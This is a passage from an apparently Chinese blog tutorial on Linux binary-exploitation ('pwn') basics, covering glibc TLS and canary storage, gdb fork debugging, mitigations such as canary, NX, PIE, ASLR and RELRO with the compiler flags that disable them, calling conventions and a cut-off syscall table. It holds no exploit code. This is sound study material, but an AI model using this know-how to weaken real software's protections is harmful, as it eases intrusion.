<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Install the dtv pointer.  The pointer passed is to the element with</span></span><br><span class="line"><span class="comment">   index -1 which contain the length.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INSTALL_DTV(descr, dtvp) \</span></span><br><span class="line"><span class="meta">  ((tcbhead_t *) (descr))-&gt;dtv = (dtvp) + 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">allocate_dtv</span> <span class="params">(<span class="type">void</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">size_t</span> dtv_length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We allocate a few more elements in the dtv than are needed for the</span></span><br><span class="line"><span class="comment">     initial set of modules.  This should avoid in most cases expansions</span></span><br><span class="line"><span class="comment">     of the dtv.  */</span></span><br><span class="line">  dtv_length = GL(dl_tls_max_dtv_idx) + DTV_SURPLUS;</span><br><span class="line">  dtv = <span class="built_in">calloc</span> (dtv_length + <span class="number">2</span>, <span class="keyword">sizeof</span> (<span class="type">dtv_t</span>));</span><br><span class="line">  <span class="keyword">if</span> (dtv != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the initial length of the dtv.  */</span></span><br><span class="line">      dtv[<span class="number">0</span>].counter = dtv_length;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The rest of the dtv (including the generation counter) is</span></span><br><span class="line"><span class="comment">	 Initialize with zero to indicate nothing there.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Add the dtv to the thread data structures.  */</span></span><br><span class="line">      INSTALL_DTV (result, dtv);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls_init</code> 函数会遍历 <code>dl_tls_dtv_slotinfo_list</code> 中的 <code>link_map</code> ，初始化 <code>dtv</code> 数组并将初始数据复制到 TLS 变量中。<strong>从这里可以看出，如果一个模块有 TLS 变量，则该模块对应的 <code>dtv-&gt;pointer.val</code> 指向 TLS 变量的起始地址。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = TLS_DTV_UNALLOCATED;</span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_tls_offset == NO_TLS_OFFSET</span><br><span class="line">    || <span class="built_in">map</span>-&gt;l_tls_offset == FORCED_DYNAMIC_TLS_OFFSET)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Set up the DTV entry.  The simplified __tls_get_addr that</span></span><br><span class="line"><span class="comment">   some platforms use in static programs requires it.  */</span></span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = dest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy the initialization image and clear the BSS part.  */</span></span><br><span class="line"><span class="built_in">memset</span>(__mempcpy (dest, <span class="built_in">map</span>-&gt;l_tls_initimage,</span><br><span class="line">                  <span class="built_in">map</span>-&gt;l_tls_initimage_size), <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">       <span class="built_in">map</span>-&gt;l_tls_blocksize - <span class="built_in">map</span>-&gt;l_tls_initimage_size);</span><br></pre></td></tr></table></figure></div>
<p>回到 <code>__pthread_create_2_1</code> 函数，在完成了 <code>pthread</code> 的一系列初始化后调用了 <code>THREAD_COPY_STACK_GUARD</code> 和 <code>THREAD_COPY_POINTER_GUARD</code> 两个宏，这两个宏的展开如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">((pd)-&gt;header.stack_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.stack_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">((pd)-&gt;header.pointer_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.pointer_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p>不难看出这两个宏把当前线程（当前 fs 寄存器还没有指向新线程的 TCB）的 TLS 中的 <code>stack_guard</code> 和 <code>pointer_guard</code> 都复制到子线程的 TLS 的对应位置上。<strong>因此可以确定线程的 <code>stack_guard</code> 和 <code>pointer_guard</code> 与主线程相同。</strong></p>
<p>最后需要确定是 fs 寄存器何时被修改，因为 fs 寄存器不能再用户态修改，因此一定是一个系统调用完成了对 fs 寄存器的修改。</p>
<p>通过调试发现，<code>pthread_create-&gt;create_thread-&gt;clone</code> 中的 <code>clone</code> 系统调用完成了对 fs 寄存器的修改。</p>
<h1 id="子进程调试"><a href="#子进程调试" class="headerlink" title="子进程调试"></a>子进程调试</h1><p>gdb默认情况下，父进程 <code>fork</code> 一个子进程，gdb 只会继续调试父进程而不会管子进程的运行（pwndbg 插件设置相反）。</p>
<h2 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h2><ul>
<li>跟踪子进程进行调试，可以使用 <code>set follow-fork-mode mode</code> 来设置 <code>fork</code> 跟随模式。<ul>
<li><code>show follow-fork-mode</code>：进入 gdb 以后，我们可以使用 <code>show follow-fork-mode</code> 来查看目前的跟踪模式。</li>
<li><code>set follow-fork-mode parent</code>：gdb 只跟踪父进程，不跟踪子进程，这是默认的模式。</li>
<li><code>set follow-fork-mode child</code>：gdb 在子进程产生以后只跟踪子进程，放弃对父进程的跟踪。</li>
</ul>
</li>
<li>想同时调试父进程和子进程，以上的方法就不能满足了。Linux 提供了 <code>set detach-on-fork mode</code> 命令来供我们使用。<ul>
<li><code>show detach-on-fork</code>：<code>show detach-on-fork</code> 显示了目前是的 <code>detach-on-fork</code> 模式。</li>
<li><code>set detach-on-fork on</code>：只调试父进程或子进程的其中一个（根据 <code>follow-fork-mode</code> 来决定），这是默认的模式。</li>
<li><code>set detach-on-fork off</code>：父子进程都在 gdb 的控制之下，其中一个进程正常调试（根据 <code>follow-fork-mode</code> 来决定），另一个进程会被设置为暂停状态。</li>
</ul>
</li>
</ul>
<h2 id="调试进程切换"><a href="#调试进程切换" class="headerlink" title="调试进程切换"></a>调试进程切换</h2><p>使用 gdb 调试多进程时，如果想要在进程间进行切换，那么就需要</p>
<ul>
<li>在 <code>fork</code> 调用前设置： <code>set detach-on-fork off</code>。</li>
<li>使用 <code>info inferiors</code> 来查看进程信息，得到的信息可以看到最前面有一个进程编号，使用 <code>inferior num</code> 来进行进程切换。</li>
</ul>
<h1 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h1><p>checksec 可以查看程序开启了哪些保护。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ checksec /bin/ls                                   </span><br><span class="line">[*] <span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>canary 是一种防止缓冲区溢出攻击的保护机制。它的基本思想是在程序的堆栈中插入一个随机生成的数值，用于检测缓冲区溢出攻击。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001189 endbr64</span><br><span class="line">.text:000000000000118D push    rbp</span><br><span class="line">.text:000000000000118E mov     rbp, rsp</span><br><span class="line">.text:0000000000001191 sub     rsp, 30h</span><br><span class="line">.text:0000000000001195 mov     rax, fs:28h</span><br><span class="line">.text:000000000000119E mov     [rbp-8], rax</span><br><span class="line">...</span><br><span class="line">.text:00000000000011CE mov     rdx, [rbp-8]</span><br><span class="line">.text:00000000000011D2 xor     rdx, fs:28h</span><br><span class="line">.text:00000000000011DB jz      short locret_11E2</span><br><span class="line">.text:00000000000011DB</span><br><span class="line">.text:00000000000011DD call    ___stack_chk_fail</span><br><span class="line">.text:00000000000011DD</span><br><span class="line">.text:00000000000011E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011E2</span><br><span class="line">.text:00000000000011E2 locret_11E2:                            ; CODE XREF: f+52↑j</span><br><span class="line">.text:00000000000011E2 leave</span><br><span class="line">.text:00000000000011E3 retn</span><br></pre></td></tr></table></figure></div>
<p>canary 的初始值存储在 tls 中，也就是前面提到的 <code>stack_guard</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005826545.png"
                      alt="image-20241108005826545"
                ><br>在编译 c 程序时使用 <code>-fno-stack-protector</code> 参数可以关闭 canary 保护（注意高版本的 gcc 的 canary 保护关不掉)。</p>
<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX 即 No-eXecute（不可执行），NX 的基本原理是将数据所在内存页标识为不可执行，也就是同一内存可写与可执行不共存。</p>
<p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 <code>-zexecstack</code> 参数。</p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE 主要随机了代码段（<code>.text</code>），初始化数据段（<code>.data</code>）和未初始化数据段（<code>.bss</code>）的地址。另外 PIE 是否开启还会影响堆的基址。</p>
<ul>
<li><p>开启 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005851039.png"
                      alt="image-20241108005851039"
                ></p>
</li>
<li><p>关闭 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005913715.png"
                      alt="image-20241108005913715"
                ></p>
</li>
</ul>
<p>在编译 c 程序时使用 <code>-no-pie</code> 参数可以关闭 PIE 保护。</p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR 是系统级别的地址随机。通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 的值可以控制 ASLR 的级别：</p>
<ul>
<li>0：关闭 ASLR</li>
<li>1：栈基址，共享库，mmap 基址随机</li>
<li>2：在 1 的基础上增加堆基址的随机</li>
</ul>
<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><ul>
<li>当 RELRO 保护为 NO RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读可写。</li>
<li>为 PARTIAL RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 根据实际调试结果判断是否可写，<code>got.plt</code> 可读可写。</li>
<li>为 FULL RELRO 时，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读不可写。</li>
<li><code>-Wl,-z,norelro</code> 编译参数可以关闭 RELRO ，使 RELRO 状态变为 NO RELRO 。</li>
<li><code>-Wl,-z,lazy</code> 会开启延迟绑定，使 RELRO 状态变为 Partial RELRO 。</li>
</ul>
<h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><h2 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005938556.png"
                      alt="image-20241108005938556"
                ><br><strong>注意 canary 不一定与 ebp 相邻，因为有些函数会先将一些寄存器保存到栈中。canary 实际位置以调试为准。</strong></p>
<h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p>32位为例：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push args</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>call func</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>push next_eip</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>jmp func</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push ebp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>mov ebp,esp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>leave</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>mov esp,ebp</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>pop ebp</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>ret (pop eip)</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp; \text{push args}\\
&amp; \text{call func}\left\{\begin{matrix}
\text{push next\_eip}\\ 
\text{jmp func}
\end{matrix}\right.\\
&amp; \text{push ebp}\\
&amp; \text{mov ebp,esp}\\
&amp; \vdots \\
&amp; \text{leave}\left\{\begin{matrix}
\text{mov esp,ebp}\\ 
\text{pop ebp}
\end{matrix}\right.\\
&amp;\text{ret}\ \text{(pop eip)}
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.5601em;vertical-align:-6.53em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.69em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-5.49em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-3.99em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.83em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.28em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:2.37em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.8775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push args</span></span></span></span><span style="top:-7.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">call func</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">push next_eip</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">jmp func</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-5.6775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push ebp</span></span></span></span><span style="top:-4.1775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">mov ebp,esp</span></span></span></span><span style="top:-2.0175em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:0.0925em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">leave</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">mov esp,ebp</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">pop ebp</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:2.1825em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">ret</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">(pop eip)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span></span></span></span></span></span></span>


<h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2>
  <div class="note p-4 mb-4 rounded-small red icon-padding">
    <i class="note-icon fa-solid fa-bolt"></i><p>注意：通常 linux 下的程序的函数调用都是外平栈的。</p>

  </div>

<h3 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h3><ul>
<li>普通函数传参：参数基本都压在栈上（有寄存器传参的情况，可查阅相关资料）。</li>
<li><code>int 0x80</code> 传参：eax对应系统调用号，ebx、ecx、edx、esi、edi、ebp 分别对应前六个参数多余的参数压在栈上。</li>
</ul>
<h3 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h3><ul>
<li>普通函数传参：先使用 rdi、rsi、rdx、rcx、r8、r9 寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上。</li>
<li><code>syscall</code> 传参：rax 对应系统调用号，传参规则与普通函数传参一致。</li>
</ul>
<h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><h3 id="32-位"><a href="#32-位" class="headerlink" title="32 位"></a>32 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 